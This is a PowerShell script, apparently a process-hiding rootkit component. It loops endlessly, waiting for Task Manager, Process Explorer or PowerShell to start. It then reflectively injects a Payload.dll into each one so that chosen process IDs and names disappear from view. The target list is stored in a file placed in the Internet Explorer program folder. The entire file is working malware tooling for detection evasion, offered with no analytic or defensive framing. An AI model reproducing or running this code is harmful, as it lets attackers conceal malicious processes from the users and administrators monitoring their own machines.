param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
function writeFiles
{
    param([string[]] $n=@(),[int[]] $i=@())
    $infoTransfetPath="C:\Program Files\Internet Explorer\mdsint.isf"
    $ofs=','
    [string]$i|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Force
    [string]$n|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
    
}

function isElevated
{
param()
 $wid=[System.Security.Principal.WindowsIdentity]::GetCurrent()
 $prp=new-object System.Security.Principal.WindowsPrincipal($wid)
 $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
 return $prp.IsInRole($adm)
}



function is64bit($a){
try{
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, 
 CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
 [In] System.IntPtr hProcess,
 [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32
}catch{}
if(-not [System.Environment]::Is64BitOperatingSystem)
    {return}
$is32Bit=[int]0 
if ([Kernel32.NativeMethods]::IsWow64Process($a.Handle, [ref]$is32Bit)) {$(if ($is32Bit) {$false} else {$true})} else {"IsWow64Process call failed"}
}


function procHiderDaemon
{
    param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
    $isElev =isElevated
    if(-not $isElev)
    {
        Write-Host 'This script need admin privilages!'
        $choice = read-host "Do you want to continue? (Y/N)"
        while ($choice -notmatch "[y|n]")
            {
            $choice = read-host "Invalid answer. Do you want to continue? (Y/N)"
            }
        if ($choice -eq "n")
        {
            return
        }
     }
    $frobiddenProcessesNames = @("taskmgr","procexp","procexp64","powershell")
    $frobiddenProcessesNames+=$x
    $hiddenPIDs =$i
    $hiddenProcNames=$n
    if($hiddenPIDs.Count+$hiddenProcNames.Count -eq 0)
    {
        Write-Host 'You must use either -i or -n!'
        return
    }
    $hiddenPIDs+=$pID

    writeFiles -i $hiddenPIDs -n $hiddenProcNames
    $livingFrobiddenProcesses =@()
    $nextLivingFrobProc=@()
    while($true)
    {
        $GetProcRes=Get-Process -Name $frobiddenProcessesNames -ErrorAction Ignore
        foreach($proc in $GetProcRes)
        {
           
                    if($proc.ID -eq $pID)
                    {
                    continue
                    }
                    $nextLivingFrobProc+=$proc.ID
                    if($livingFrobiddenProcesses -notcontains $proc.ID)
                    {
                        #Start-Sleep -m 200
                        if(Get-Process -Id $proc.ID -ErrorAction Ignore)
                            {
                            Write-Host $proc.Name is alive! pID =  $proc.ID
                            $targetDLLpath=(Split-Path $PSScriptRoot)+'\BuildOutput\x'+$(if([System.Environment]::Is64BitOperatingSystem){'64'} else {'86'}) +'Payload.dll'
                            $DLLbytes = [System.IO.File]::ReadAllBytes($targetDLLpath)
                            . $PSScriptRoot"\Invoke-ReflectivePEInjection.ps1"
                            try
                            {
                            Invoke-ReflectivePEInjection -PEBytes $DLLbytes -ProcId $proc.ID
                            }
                            catch{}
                            "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"


                            }
                    
                    } 
         }
      $livingFrobiddenProcesses=$nextLivingFrobProc
      $nextLivingFrobProc=@()
        
    }
}

procHiderDaemon
